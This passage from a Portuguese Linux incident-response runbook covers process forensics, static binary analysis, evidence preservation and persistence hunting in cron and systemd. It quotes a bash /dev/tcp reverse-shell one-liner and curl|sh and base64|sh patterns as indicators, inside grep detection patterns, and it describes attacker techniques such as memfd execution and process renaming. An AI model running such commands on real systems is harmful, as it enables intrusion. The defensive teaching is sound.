> **O achado que quase ninguém usa: o ambiente identifica QUEM lançou o processo.** O `environ` é fixado no `exec` e não muda depois — é uma fotografia do contexto de lançamento, e cada lançador deixa uma assinatura diferente:

```text
SSH_CONNECTION / SSH_CLIENT / SSH_TTY   nasceu de sessão SSH interativa — e o valor de
                                        SSH_CONNECTION contém o IP DE ORIGEM do atacante (§12)
INVOCATION_ID / JOURNAL_STREAM          foi lançado pelo systemd → existe uma unit (§7.2)
PATH mínimo, sem SSH_*, sem TERM        cara de cron (§7.1)
mesmo environ do processo da app        nasceu de dentro da app: RCE (§16)
LD_PRELOAD definido                     rootkit de userland (§7.8)
```

```bash
sudo sh -c "tr '\0' '\n' < /proc/$PID/environ" | grep -E 'SSH_|INVOCATION_ID|JOURNAL_STREAM|LD_'
# compare com o processo do serviço, para ver se o filho herdou o ambiente do pai
sudo sh -c "tr '\0' '\n' < /proc/<PID_DO_SERVICO>/environ" | sort > /tmp/a
sudo sh -c "tr '\0' '\n' < /proc/$PID/environ" | sort | diff /tmp/a - | head
```

> Quando o `pstree` já perdeu o pai (`PPid 1`, §3.2), o `environ` e o cgroup (§3.11) são as duas vias que ainda restauram a origem.

---

## 3.7. UID/GID/capabilities

```bash
sudo grep -E \
'Name|State|Pid|PPid|Uid|Gid|TracerPid|Cap' \
/proc/$PID/status
```

Capabilities:

```bash
sudo grep '^Cap' /proc/$PID/status
```

```text
Uid: real, efetivo, saved, fs → efetivo != real indica setuid/troca de privilégio
TracerPid: != 0 → alguém está com ptrace neste processo (debug, injeção ou hooking)
CapEff: poder REAL agora  → 0000000000000000 = sem capability
        decodifique: capsh --decode=<hex>
```

> Um processo não-root com `CapEff` gordo (ex.: `cap_setuid`, `cap_sys_ptrace`, `cap_net_raw`) é root disfarçado: capability substitui o SUID e passa despercebida em auditoria por UID.

---

## 3.8. File descriptors

```bash
sudo ls -la /proc/$PID/fd
```

Procure:

```text
socket:[...]
/dev/ptmx
/dev/pts/*
arquivos em /tmp
arquivos em /dev/shm
arquivos deletados
pipes
NFS/CIFS
```

> **O sinal mais forte:** `0`, `1` e `2` (stdin/stdout/stderr) apontando para o **mesmo `socket:[...]`**. Isso é a definição de reverse shell — o shell lê comandos da rede e devolve a saída por ela. Some `/dev/pts/*` e você tem shell interativo com TTY do outro lado.

---

## 3.9. Arquivos e sockets abertos

Tudo:

```bash
sudo lsof -Pan -p "$PID"
```

Somente rede:

```bash
sudo lsof -Pan -a -p "$PID" -i
```

> A §3.8 lista os fds crus; aqui o `lsof` os **traduz** — tipo, tamanho, caminho do arquivo, endereço do socket. Três linhas valem o comando: arquivo aberto em diretório de dados da app (leitura em massa = §37), biblioteca carregada de fora de `/usr/lib` (§7.8), e `IPv4 ... ESTABLISHED` para endereço público — a linha que amarra este processo ao C2 da §2.

---

## 3.10. Maps e memória mapeada

```bash
sudo cat /proc/$PID/maps
```

O que procurar (colunas: `endereço perms offset dev inode caminho`):

```bash
sudo grep 'rwx' /proc/$PID/maps                       # gravável E executável ao mesmo tempo
sudo grep '(deleted)' /proc/$PID/maps                 # binário/lib apagados do disco (§3.14)
sudo awk '$6 ~ /\// && $6 !~ /^\/(usr|lib|lib64|etc)/ {print $6}' /proc/$PID/maps | sort -u
```

```text
rwxp                     o processo pode escrever código e executá-lo. NORMAL em runtime com
                         JIT (Java, Node, .NET); ANORMAL em binário C/Go simples
executável e ANÔNIMO     região sem arquivo nenhum por trás: código que nunca existiu em disco
(sem path)               — é a assinatura de injeção (o que o 'malfind' do Volatility procura, §32)
(deleted)                o arquivo mapeado não existe mais (§3.14)
path em /tmp, /dev/shm,
home ou fora de /usr/lib lib carregada de onde ninguém instala = hijack ou preload (§7.8)
```

> `MemoryDenyWriteExecute=yes` (§34.1) é exatamente o controle que torna a primeira linha impossível — por isso ele quebra packer e injeção de código.

---

## 3.11. Cgroups / serviço responsável

```bash
sudo cat /proc/$PID/cgroup
sudo systemctl status "$PID"          # em systemd, resolve direto para a unit
```

Como ler a linha:

```text
0::/system.slice/nginx.service          serviço do sistema → a unit é o nome antes de '.service'
0::/user.slice/user-1000.slice/session-3.scope   nasceu de uma SESSÃO de login (§12)
0::/system.slice/docker-<ID>.scope       veio de um container → §38.1
0::/kubepods/burstable/pod<UID>/...      veio de um pod → §38.2
```

> **É o que restaura o pai quando `PPid=1`.** Daemonizar (duplo fork) faz o processo perder o pai, mas **não** o tira do cgroup: ele continua registrando de qual unit, sessão ou container aquilo saiu. Quando o `pstree` (§3.2) termina em `systemd` e não diz nada, é aqui — e no `environ` (§3.6) — que a origem reaparece.

---

## 3.12. Processos do mesmo usuário

```bash
ps -fu <USER>
```

Mais detalhado:

```bash
ps -eo \
pid,ppid,user,lstart,etime,stat,args \
| grep '<USER>'
```

> **A lógica:** comprometido um processo, o atacante herda o alcance daquele **usuário** — e raramente deixa só um. Este comando revela o irmão que você não estava procurando. Ordene mentalmente pelo `lstart`: os que nasceram na mesma janela do artefato (§9) provavelmente são a mesma operação; um `etime` muito maior que o dos outros é candidato a ter sido o primeiro.

---

## 3.13. Buscar processos por nome

```bash
pgrep -af '<NOME>'
```

Por usuário:

```bash
pgrep -a -u <USER> '<NOME>'
```

> `pgrep -a` casa contra a **cmdline inteira**, não só o nome — então acha `bash -c 'curl ... | sh'`, que um `pgrep bash` puro perderia.

> **E o limite:** se o processo foi renomeado (`exec -a`, §7.1) ou se disfarça de thread de kernel, procurar por nome não acha **nada** — e o vazio parece limpeza. Nesse caso a entrada é outra: a conexão (§2), o arquivo no filesystem (§8) ou o que executa sozinho (§7).

---

## 3.14. Executáveis deletados ainda em execução

```bash
sudo lsof +L1
```

Filtrar:

```bash
sudo lsof +L1 | grep '(deleted)'
```

Isto é importante porque:

```text
rm malware
```

não mata um processo já em execução.

> **Mecanismo:** no Linux, `rm` só remove o *nome* (link) do diretório. O inode e os blocos só são liberados quando o último link **e** o último file descriptor somem. Enquanto o processo roda, o binário continua íntegro em disco — `+L1` significa "link count 0, ainda aberto". Técnica padrão de malware: executar e apagar em seguida.

Recupere o binário apagado direto do `/proc` (o link `exe` continua válido):

```bash
sudo cp /proc/$PID/exe "$IR/samples/recovered.bin"
```

> Um passo além disso: o binário que **nunca** esteve em disco (`memfd`) — §3.16.

---

## 3.15. Namespaces (esconderijo sem container)

Um processo pode viver em namespace próprio de mount, PID ou rede **sem ser container gerenciado** — basta um `unshare`. Nesse caso ele enxerga um `/` diferente do seu, e o `find` que você roda não acha os arquivos dele.

```bash
lsns                                       # todos os namespaces e o processo líder de cada um
sudo ls -l /proc/$PID/ns/                  # os namespaces DESTE processo
sudo readlink /proc/1/ns/mnt /proc/1/ns/net /proc/$PID/ns/mnt /proc/$PID/ns/net   # compare com o PID 1
sudo nsenter -t "$PID" -a ls -la /         # entra no namespace dele e olha de dentro
```

> **Como ler:** cada `ns/*` aponta para um inode (`mnt:[4026531840]`). Inode **diferente** do PID 1 em um processo que **não** está num cgroup de container (§3.11) significa que alguém criou o namespace de propósito. Isso explica dois "impossíveis" sem precisar de rootkit: o arquivo que o `/proc/<pid>/cwd` aponta e o `ls` não acha (namespace de `mnt`), e a conexão que o `tcpdump` vê mas o `ss` do host não lista (namespace de `net`). Antes de concluir §35, descarte isto.

---

## 3.16. Fileless: o binário que nunca tocou o disco

A §3.14 trata do arquivo apagado **depois** de executar. Aqui é o passo seguinte: o arquivo **nunca existiu**. Não há o que o `find` encontre (§8), o que o `sha256sum` calcule (§5.4) nem o que o `rpm -Va` compare (§24) — e o resultado vazio dessas seções **não significa nada**.

As formas, e o rastro de cada uma:

```text
memfd_create + fexecve   ELF escrito num arquivo ANÔNIMO em RAM e executado dali
                         → /proc/<pid>/exe aponta para /memfd:<nome> (deleted)
interpretador em pipe    curl|bash, base64 -d|sh, python -c, perl -e
                         → só a cmdline (§3.5); em disco, nada
built-in do shell        bash -i >& /dev/tcp/IP/PORTA 0>&1 — nem binário externo existe
                         → cmdline + fd apontando para socket (§3.8)
injeção em processo vivo ptrace, ou escrita em /proc/<pid>/mem
                         → TracerPid != 0 (§3.7) e região anônima rwx (§3.10)
tmpfs                    /dev/shm, /run — o arquivo existe, mas em RAM: some no reboot
eBPF                     sem módulo e sem arquivo (§35.4)
```

```bash
# 1) memfd — o mais direto, e o que quase ninguém procura
sudo ls -l /proc/*/exe 2>/dev/null | grep -i memfd
sudo grep -l memfd /proc/*/maps 2>/dev/null

# 2) todo 'exe' que aponta para algo inexistente (cobre memfd E apagado)
for p in /proc/[0-9]*; do
  e=$(sudo readlink "$p/exe" 2>/dev/null) || continue
  case "$e" in *'(deleted)'*|/memfd:*) echo "$p -> $e";; esac
done

# 3) interpretador consumindo código de fora
sudo ps -eo pid,user,args \
  | grep -EI 'curl.*\|.*(ba)?sh|base64 -d|python[0-9.]* -c|perl -e|/dev/tcp/' | grep -v grep

# 4) executável em tmpfs (existe agora, some no reboot)
findmnt -nt tmpfs -o TARGET | while read -r m; do sudo find "$m" -type f -perm /111 2>/dev/null; done
```

> **`/memfd:` no `exe` é praticamente conclusivo.** Processo legítimo quase nunca executa a partir de memória anônima — as exceções são poucas e conhecidas (alguns runtimes e empacotadores). Se o `readlink` devolve `/memfd:algo (deleted)`, há execução fileless e o binário **existe apenas dentro daquele processo**.

> **Consequência direta para a coleta:** matar o processo (§20) destrói a única cópia que existe. `cp /proc/<pid>/exe` continua funcionando — o kernel mantém o inode anônimo enquanto o processo viver — e o `gcore` pega a memória. Isto vem **antes** de qualquer outra coisa (§6, §29):

```bash
sudo cp /proc/$PID/exe "$IR/samples/fileless-$PID.bin"
sudo gcore -o "$IR/samples/fileless-$PID.core" "$PID"
```

> **E a persistência não é fileless.** Payload em memória morre no reboot: para voltar, ele precisa de um gatilho — e o gatilho está em disco (§7) ou no metadata da cloud (§7.12). Se você achou execução fileless e **nenhuma** persistência, procure de novo: ou o gatilho existe e passou, ou o atacante está reexplorando o vetor (§16) a cada vez. As duas hipóteses mudam o que fazer.

---

# 4. Checklist rápido de processo

> **Por quê:** roda de uma vez a identidade completa de um PID suspeito. **Olhe para:** exe/cwd/cmdline incoerentes com o nome exibido, fds de socket/PTY, arquivo deletado ainda aberto.

**O bloco responde cinco perguntas, nesta ordem:**

```text
1. ele É o que diz ser?    nome no ps  x  /proc/<pid>/exe          §3.3
2. quem o criou?           ppid, pstree, cgroup                    §3.2 §3.11
3. com que poder roda?     Uid/Gid, CapEff                         §3.7
4. com quem ele fala?      fd, lsof -i                             §3.8 §3.9
5. desde quando?           lstart, etime                           §3.1
```

```bash
PID=<PID>

sudo ps -o pid,ppid,user,group,lstart,etime,stat,args -p "$PID"
sudo pstree -aps "$PID"

sudo readlink -f /proc/$PID/exe
sudo readlink -f /proc/$PID/cwd

sudo sh -c "tr '\0' ' ' < /proc/$PID/cmdline"; echo
sudo sh -c "tr '\0' '\n' < /proc/$PID/environ"

sudo grep -E \
'Name|State|Pid|PPid|Uid|Gid|TracerPid|Cap' \
/proc/$PID/status

sudo ls -la /proc/$PID/fd
sudo lsof -Pan -p "$PID"
sudo lsof -Pan -a -p "$PID" -i
```

**Como ler o conjunto.** Nenhum item sozinho fecha o caso; a combinação sim:

```text
nome no ps ≠ basename do exe                 masquerading — sozinho já é forte (§3.3)
exe em /tmp, /dev/shm, ~/.config, ~/.cache   software legítimo não mora lá (§8)
exe marcado '(deleted)'                      executou e apagou: clássico (§3.14)
fd 0, 1 e 2 no MESMO socket                  reverse shell, por definição (§3.8)
socket + /dev/pts/*                          shell interativo com TTY do outro lado (§17)
PPid=1 sem unit correspondente               daemonizou para perder o rastro (§3.11)
CapEff != 0 num processo não-root            root disfarçado (§3.7)
TracerPid != 0                               alguém tem ptrace nele: debug ou injeção
etime longo num processo desconhecido        já estava aqui antes de você começar a olhar
environ com LD_PRELOAD, GS_*, PM2_*          entrega a técnica e às vezes a família (§5.10)
cwd em diretório de dados/upload da app      dá o vetor de graça (§16)
```

> **Dois ou três juntos dispensam a discussão.** Um processo cujo `exe` está em `~/.cache`, com `fd 0/1/2` no mesmo socket e `PPid 1`, não tem explicação inocente: trate como comprometimento confirmado e vá para a §6 (preservar) **antes** de qualquer outra coisa.

> **E o contrário também informa:** `exe` dentro de `/usr/bin` com pacote correspondente (§24), `CapEff` zerado, sem socket e com `PPid` de uma unit conhecida — isso é um processo normal com nome infeliz. Descarte e siga.

> **Diferença para a §29:** este bloco é para **ler na tela** e decidir. A §29 é o mesmo material para **salvar em arquivo** durante a coleta. Se o processo pode morrer a qualquer momento (ou você vai matá-lo), rode a §29 primeiro e leia depois — evidência primeiro, análise depois (§28).

---

# 5. Arquivo/binário

> **Por quê:** identificar o binário **sem executá-lo** (família, C2, capacidade) e datar quando surgiu. **Olhe para:** `ctime` recente com `mtime` antigo (timestomp), arquivo sem pacote correspondente, strings de C2/shell/base64, ELF em local incomum.

Defina:

```bash
FILE=$(sudo readlink -f /proc/$PID/exe)
```

---

## 5.1. Metadata

```bash
sudo ls -la "$FILE"
sudo stat "$FILE"
```

Informações extras:

```bash
sudo getfacl "$FILE"
sudo lsattr "$FILE"
sudo getcap "$FILE"
```

Filesystem/mount:

```bash
findmnt -T "$FILE"
```

O que cada um responde:

```text
dono/grupo   binário de sistema é root:root. Arquivo de root dentro de diretório da app —
             ou com dono = usuário da app em /usr/local/bin — é anomalia (§14)
modo         777/666 não sai de instalador nenhum; 4755 é SUID (§25)
getfacl      ACL dá acesso ALÉM do que o 'ls -l' mostra; um '+' no fim do modo é a pista
lsattr       'i' = imutável, travado contra remoção; 'a' = append-only, anti-forense (§21)
getcap       capability no arquivo = poder de root sem SUID, e sem aparecer no find -perm (§25)
findmnt -T   está em noexec? em FS remoto? em tmpfs (some no reboot, junto com sua evidência)?
```

> `getfacl` e `lsattr` estão aqui porque são as duas formas de esconder poder de quem lê só o modo: o `ls -l` sinaliza ACL com um `+` discreto e **não mostra nada** sobre atributos de inode.

> **A combinação que fecha sozinha:** arquivo executável, dono `root:root`, morando em `/tmp` ou no home de um usuário de aplicação, com `ctime` dentro da janela do incidente (§5.2). Nenhum gerenciador de pacotes produz isso.

---

## 5.2. Datas

No `stat`, compare:

```text
Access
Modify
Change
Birth
```

Especial atenção ao `ctime` (`Change`).

Exemplo:

```text
Modify: 2018-07-03
Change: 2026-04-30 18:30:33
```

Um `mtime` muito antigo com `ctime` recente pode indicar:

* timestamp preservado;
* timestomping;
* arquivo copiado mantendo mtime.

> **Por que o `ctime` é o timestamp confiável:** `atime`/`mtime` podem ser definidos livremente (`touch -t`, `utimes()`) — é assim que o atacante "envelhece" o artefato. O `ctime` é atualizado pelo **kernel** a cada mudança do inode e **não existe syscall para defini-lo**: só muda mexendo no relógio ou escrevendo no filesystem raw. Ou seja: o `mtime` é o que o arquivo *alega*; o `ctime` é o que o sistema *observou*.

```text
Birth   criação (nem todo fs preenche; ext4 sim, mostrado como '-' quando ausente)
Access  última leitura (pode estar desativado por 'relatime'/'noatime' — não confie)
Modify  último write no CONTEÚDO      → falsificável
Change  última mudança no INODE       → conteúdo, permissão, dono, rename, timestomp
```

> Corolário prático: `touch` para disfarçar o `mtime` **atualiza o `ctime`** e denuncia o próprio disfarce. Por isso a busca da §9 é por `ctime`.

---

## 5.3. Tipo

```bash
sudo file "$FILE"
```

> `file` lê os *magic bytes*, não a extensão. Leia a saída inteira: **`statically linked`** (não depende de libs do host — típico de dropper portátil), **`stripped`** (sem símbolos — dificulta análise, incomum em binário de distro), e a arquitetura (um ELF x86-64 num host ARM = kit genérico jogado às cegas).

---

## 5.4. Hashes

```bash
sudo sha256sum "$FILE"
```

Opcional:

```bash
sudo sha1sum "$FILE"
sudo md5sum "$FILE"
```

Use SHA-256 como referência principal.

> O hash é a **identidade** do artefato: é o que você consulta em VirusTotal/threat intel, o que procura na frota (§23) e o que prova depois que a amostra preservada é a mesma. MD5/SHA-1 só servem para bater com bases antigas — são vulneráveis a colisão.

> **OpSec:** subir o *arquivo* para um serviço público pode entregar seu incidente (o atacante monitora e some/muda de C2, e o binário pode conter secrets do seu ambiente). Consultar só o **hash** não vaza conteúdo.

---

## 5.5. Strings

```bash
sudo strings -a -n 8 "$FILE" | less
```

Filtrar indicadores:

```bash
sudo strings -a "$FILE" \
  | grep -Ei \
  'http|https|socket|connect|shell|bash|sh|curl|wget|ssl|tls|auth|key|password'
```

Pode revelar:

* família do malware;
* nomes de bibliotecas;
* C2;
* parâmetros;
* variáveis de ambiente;
* paths;
* domínio/IP.

> **Se vier quase nada legível, isso é o achado:** binário normal tem centenas de strings (mensagens de erro, nomes de símbolo, paths). Pouquíssimas strings + seções estranhas = **packed/criptografado** (UPX e derivados). Nesse caso o disco não vai contar a história — o C2 e a config só existem **em memória**, descompactados, enquanto o processo roda: vá para §6.

---

## 5.6. Binário ELF

Header:

```bash
sudo readelf -h "$FILE"
```

Program headers:

```bash
sudo readelf -l "$FILE"
```

Sections:

```bash
sudo readelf -S "$FILE"
```

Dynamic section:

```bash
sudo readelf -d "$FILE"
```

Symbols:

```bash
sudo readelf -s "$FILE"
```

Informações gerais:

```bash
sudo objdump -p "$FILE"
```

O que cada saída responde:

```text
-h  tipo (EXEC x DYN), arquitetura, entry point
-d  NEEDED = libs de que depende | RPATH/RUNPATH = onde procura libs (vetor de hijack)
-S  seções: poucas/sem nome, ou uma seção enorme e gravável+executável = packer
-s  símbolos: vazio (stripped) é comum em malware, raro em pacote de distro
-l  segmentos carregados; RWX no mesmo segmento = código automodificável
```

> Dois achados clássicos aqui: `RUNPATH` apontando para diretório gravável (o binário carrega a lib do atacante) e entry point fora da `.text` (descompactador de packer).

---

## 5.7. Hex

Os primeiros bytes dizem o que o arquivo **é**, independente de nome, extensão e do que o `file` reportar:

```bash
sudo xxd "$FILE" | head -5      # magic bytes + início do header
sudo xxd "$FILE" | tail -20     # o FIM: payload anexado depois do código
```

```text
7f 45 4c 46   .ELF   executável Linux — o 5º byte: 01=32 bits, 02=64 bits
23 21 2f      #!/    script: leia a primeira linha inteira, ela nomeia o interpretador
55 50 58 21   UPX!   empacotado com UPX → explica o "quase nenhuma string" da §5.5
4d 5a         MZ     executável WINDOWS num host Linux = kit genérico jogado às cegas
1f 8b         ..     gzip: conteúdo comprimido (dropper que se extrai)
50 4b 03 04   PK     zip/jar
```

> **Por que olhar o fim também:** anexar um payload ao final de um ELF é técnica comum — o binário roda normalmente e lê o resto de dentro de si mesmo. Se o `tail` mostrar assinatura de zip/gzip ou texto legível depois de onde o código deveria acabar, é isso; o `binwalk` (§32) confirma e extrai.

> **Entropia como atalho:** se o dump aparece como bytes sem padrão nenhum do começo ao fim — sem trechos ASCII, sem regiões de zeros, sem repetição — o conteúdo está comprimido ou cifrado. Junto com a §5.5, é o diagnóstico de *packed*, e a consequência é ir para a memória (§6): no disco não há o que ler.

---

## 5.8. Quem está usando o arquivo

```bash
sudo lsof "$FILE"
sudo fuser -v "$FILE"
```

```text
a coluna ACCESS do 'fuser -v' diz o TIPO de uso:
  e  executando — este é o binário do processo      f  arquivo aberto
  c  é o cwd do processo                            r  é a raiz (chroot) do processo
  m  mapeado em memória (lib carregada)
```

> **Se ninguém está usando, isso é informação — não fim de linha.** Duas leituras opostas: o artefato foi dropado e **ainda não rodou** (você chegou antes; o gatilho pode estar armado — vá para a §7), ou ele **já rodou e saiu** (implante que executa e morre a cada beacon — §2.7). O `atime` (§5.2, se o mount não for `noatime`) e o audit (§11) separam as duas.

> É o caminho inverso da §3.14: lá você parte do processo para achar o arquivo; aqui, do arquivo para achar o processo. Se o `lsof` não devolve nada e mesmo assim você suspeita que está rodando, o binário pode ter sido apagado com o processo vivo — aí é `lsof +L1`.

---

## 5.9. Nunca execute um arquivo suspeito

Não faça:

```bash
./malware
sudo ./malware
```

Evite também:

```bash
ldd malware
```

> **Por que `ldd` é perigoso:** ele não "lê" o binário — na prática pede ao *loader* que o carregue para resolver as dependências. Com um ELF preparado (ou `LD_TRACE_LOADED_OBJECTS` manipulado), isso **executa código**. Use `readelf -d` (§5.6), que só faz parsing.

> Mesmo raciocínio para o resto: só rode ferramenta que **lê bytes**. E se precisar detonar de verdade, faça em sandbox descartável e sem rota para sua rede.

Prefira análise estática:

```text
file
sha256sum
strings
readelf
objdump
xxd
```

---

## 5.10. Da amostra à família: o que a ferramenta te conta

**Descobrir o nome da ferramenta não é curiosidade** — é o atalho mais barato do runbook inteiro. Alguém já fez a engenharia reversa e publicou; você não precisa refazer. E o que a ferramenta **sabe fazer** é o teto do que pode ter acontecido neste host, mesmo antes de você provar cada capacidade.

Como chegar ao nome sem entregar o incidente:

```text
hash            consulta por SHA-256 em threat intel — nunca suba o arquivo (§5.4)
strings         nome do projeto, flags, string de protocolo, mensagem de erro    (§5.5)
capa            traduz o binário em CAPACIDADES sem você ler assembly            (§32)
variável de env prefixo próprio no /proc/<pid>/environ (ex.: 'GS_') entrega a família (§3.6)
nome de config  caminho em ~/.config, arquivo de estado, socket nomeado          (§7)
```

### As perguntas a fazer sobre a ferramenta — e para onde cada resposta te manda

```text
como ela fala com o operador?  relay/P2P, Tor, DNS?  → decide se §18.1 (bloquear IP) serve de algo
ela transfere arquivo?         → §37 sai de "improvável" e vira "presumir até provar o contrário"
ela abre shell interativo?     → §13 e §12: um humano digitou aqui; procure o rastro dele
faz port-forward / SOCKS?      → §12.2: este host virou pivô — olhe a rede interna
como ela persiste por padrão?  → §7: vá direto no mecanismo conhecido dela, não varra tudo
roda como root ou como user?   → §36: se precisou de root, há uma rota de privesc aberta
tem chave/segredo fixo?        → §23: é o melhor IOC de frota que existe (melhor que hash)
é commodity ou sob medida?     → §39.1: ferramenta pública = oportunista; binário próprio = dirigido
```

### Exemplo: GSocket / gs-netcat

O caso citado ao longo deste runbook, e um bom exemplo de como o nome muda a resposta:

```text
canal       rede global de relay, sem IP fixo de C2  → bloquear IP (§18.1) não resolve;
                                                       só egress default-deny corta (§34.3)
NAT         conecta nos dois sentidos sem porta aberta → não procure listener (§2): procure a SAÍDA
capacidade  shell completo, transferência de arquivo, port-forward
                                                     → §37 e §12.2 entram no escopo por padrão
empacotado  strings pobres em disco; config e segredo só em memória → §6 antes de matar (§20)
segredo     a sessão é derivada de uma chave compartilhada → IOC de frota forte (§23)
```

> Repare no que aconteceu: sem tocar no binário de novo, o nome sozinho **rebaixou** uma ação (bloquear o IP do C2, que seria inútil) e **promoveu** três (egress, exfiltração, pivô interno). É esse redirecionamento que paga o tempo de pesquisa.

> **O limite honesto:** capacidade não é prova de uso. "A ferramenta suporta exfiltração" não é "houve exfiltração" — isso continua sendo a §37.7, e o veredito pode muito bem ser INDETERMINADO. O que a família faz é mudar a sua prioridade de busca e o seu pior caso defensável, não fechar a conclusão.

> **OpSec da pesquisa** (§5.4, §32): consultar hash, nome de projeto e documentação pública é seguro. Não é seguro **baixar e rodar** a ferramenta para "entender" (§5.9), nem colar em serviço público uma string única **do seu** incidente — domínio interno, chave, caminho — que identifique você para quem monitora aquela base.

---

# 6. Preservar arquivo suspeito

> **Por quê:** guardar prova antes de qualquer alteração (post-mortem, análise, possível uso legal). Matar/apagar sem preservar destrói evidência. **Olhe para:** copiar com `-a` (preserva metadata), registrar hash, e capturar a **memória** se o binário for packed.

Antes de remover:

```bash
sudo mkdir -p "$IR/samples"
sudo chmod 700 "$IR/samples"
```

Registre **antes** de copiar:

```bash
sudo stat "$FILE"      | sudo tee "$IR/samples/stat.txt"
sudo sha256sum "$FILE" | sudo tee "$IR/samples/sha256.txt"
```

Só então copie, e confirme que a cópia é a mesma coisa:

```bash
sudo cp -a "$FILE" "$IR/samples/"
sudo sha256sum "$IR/samples/$(basename "$FILE")" | sudo tee -a "$IR/samples/sha256.txt"
```

> **A ordem não é estética.** `cp -a` preserva dono, modo, ACL, `mtime` e `atime` — mas **não há como preservar o `ctime`**: a cópia nasce com o ctime de agora. Como o `ctime` é justamente o timestamp que não se falsifica (§5.2), ele existe apenas no `stat.txt` que você gravou antes de tocar no arquivo. Invertida a ordem, a datação do artefato se perde para sempre.

> **Os dois hashes iguais são a cadeia de custódia.** É o que responde, semanas depois, "isso aí é mesmo o que estava na máquina?" — e é o que se registra no war log (§39.3).

Feche a coleta e tire do host:

```bash
sudo chmod 0400 "$IR/samples/"*
sudo tar czf "$IR.tgz" -C "$(dirname "$IR")" "$(basename "$IR")"
sha256sum "$IR.tgz"          # anote este hash FORA do host
```

> **Onde a amostra não pode ficar:** (1) no mesmo disco que o rebuild vai destruir (§27) — tire do host; (2) com bit de execução — `chmod 0400`, e renomeie para algo que ninguém clique se for circular; (3) em diretório compartilhado ou com backup/antivírus automático — o AV corporativo apaga a sua evidência, e a coleta contém `environ`, config e logs com segredo (§1).

**Além do binário, preserve o gatilho e o contexto** — eles desaparecem na §19 e na §21:

```text
a linha do cron, o arquivo da unit, a chave em authorized_keys   §7   (copie ANTES de remover)
a saída da §29 (processo) e da §30 (arquivo)
o core dump, se o binário for packed                             abaixo
o pcap, se a conexão ainda estiver viva                          §2.6
os logs do serviço na janela, antes de rotacionarem              §10
```

> Um cron apagado sem cópia é evidência perdida **e** risco operacional: se algo quebrar depois, você não tem como saber se aquela linha era legítima (§19).

## Memória do processo (binário packed)

Malware como GSocket costuma vir **empacotado**: `strings` no disco rende pouco, mas a config/segredo/C2 estão **em memória** enquanto roda. Capture ANTES de matar:

```bash
sudo gcore -o "$IR/samples/proc.core" "$PID"        # ou: sudo cp /proc/$PID/mem ...
sudo strings -n 8 "$IR/samples/proc.core"* \
  | grep -iE 'gs-netcat|gsocket|GS_|\.onion|relay|/bin/sh|password|token'
```

---

# 7. Persistência

> **Por quê:** matar o processo sem remover a persistência é enxugar gelo — cron, systemd ou supervisor relançam o malware em minutos, e agora o atacante sabe que você viu. **Olhe para:** qualquer coisa que o sistema executa **sozinho** (por tempo, por boot, por login, por evento). **Conceito:** persistência = um gatilho automático + um payload. Você precisa achar o *gatilho*; o payload você já tem.

Procure persistência **antes de matar o processo**.

Os gatilhos, em ordem de frequência real:

```text
tempo      cron, systemd timer, at, anacron                          §7.1 §7.2 §7.4
boot       unit systemd, rc.local, init.d, generator, módulo kernel   §7.2 §7.7 §7.12
login      authorized_keys, .bashrc, .ssh/rc, PAM, MOTD               §7.5 §7.6 §7.12
conexão    unit .socket — não existe processo até alguém conectar     §7.2
evento     unit .path, udev, hook de gerenciador de pacote            §7.2 §7.12
sempre     supervisor (pm2/supervisord), container restart:always     §7.10 §7.11
sombra     LD_PRELOAD, ld.so.preload, drop-in de unit, ld.so.conf.d   §7.8 §7.2
requisição módulo do servidor web, auto_prepend_file do PHP           §7.12
fora do SO startup-script / user-data no metadata da cloud            §7.12
```

> **Presuma mais de um.** Operador competente deixa persistência barulhenta (que você acha) e uma silenciosa (que você não acha). Só considere limpo depois da §22 e do re-scan em 24–48h.

---

# 7.1. Cron

Usuário:

```bash
sudo crontab -u <USER> -l
```

Root:

```bash
sudo crontab -l
```

Arquivos:

### RHEL/CentOS

```bash
sudo ls -la /var/spool/cron/
```

### Debian/Ubuntu

```bash
sudo ls -la /var/spool/cron/crontabs/
```

Sistema:

```bash
sudo cat /etc/crontab
sudo ls -la /etc/cron.d/
sudo ls -la /etc/cron.hourly/
sudo ls -la /etc/cron.daily/
```

---

## Buscar padrões suspeitos

```bash
sudo grep -RInaE \
'curl|wget|base64|bash -c|sh -c|exec -a|/tmp|/dev/shm|\.config|\.cache' \
/var/spool/cron \
/etc/cron.d \
/etc/crontab \
2>/dev/null
```

Indicadores fortes:

```text
base64 | bash
curl | sh
wget
exec -a
arquivo ELF no home
comentário tentando parecer legítimo
```

> **Por que esses padrões:** o atacante quer o payload **fora do disco** (baixado a cada execução — muda quando ele quiser, e o que fica na sua máquina é só uma linha inocente) e **ilegível** (`base64` derrota o `grep` do defensor). `exec -a` renomeia o processo na hora do exec: é como um cron vira `[kworker/0:2]` no `ps`.

> Leia o cron **como o kernel lê**: os 5 campos são `min hora dia mês dia-da-semana`. `*/7 * * * *` (a cada 7 min) e `@reboot` são os favoritos — beacon frequente e sobrevivência a restart.

---

# 7.2. Systemd

Units habilitadas:

```bash
sudo systemctl list-unit-files --state=enabled
```

Services:

```bash
sudo systemctl list-units --type=service --all
```

Timers:

```bash
sudo systemctl list-timers --all
```

> Onde olhar dentro da unit: `ExecStart`/`ExecStartPre` (o payload), `Restart=always` (o systemd vira o *supervisor do malware* — ele ressuscita o que você matar), `User=` (com qual identidade roda) e `WantedBy=` (quando dispara). Compare também o **caminho**: unit legítima de pacote fica em `/usr/lib/systemd/system`; o que o atacante escreve costuma cair em `/etc/systemd/system` (que tem precedência e pode *sobrescrever* uma unit legítima com o mesmo nome).

Pesquisar conteúdo:

```bash
sudo grep -RInaE \
'curl|wget|bash|sh|/tmp|/dev/shm|/home' \
/etc/systemd/system \
/usr/lib/systemd/system \
/lib/systemd/system \
2>/dev/null
```

**Não são só `.service` e `.timer`:**

```bash
systemctl list-units --type=socket --all      # .socket: o systemd escuta e só ENTÃO sobe o serviço
systemctl list-units --type=path --all        # .path: dispara quando um arquivo aparece ou muda
systemctl list-unit-files --type=service,socket,path,timer --state=enabled
```

> **`.socket` é um backdoor sem processo.** Com ativação por socket, quem abre a porta é o **systemd**: o binário do atacante não roda, não aparece no `ps`, e o `ss -ltnp` mostra `pid=1` como dono do listener. Ele nasce quando alguém conecta e morre quando a conexão fecha. Varredura de processo não acha nada — o que acha é a lista acima e um listener cujo dono é o systemd num serviço que você não reconhece (§2.1).

> **`.path` é o cron dos eventos:** dispara na criação ou modificação de um caminho. Sem horário fixo, não há periodicidade para correlacionar (§9, §2.7) — o gatilho é o próprio atacante escrevendo num arquivo.

**Drop-ins e overrides** — alteram uma unit legítima sem tocar no arquivo dela:

```bash
systemctl cat <UNIT>                   # a config EFETIVA: unit original + todos os drop-ins
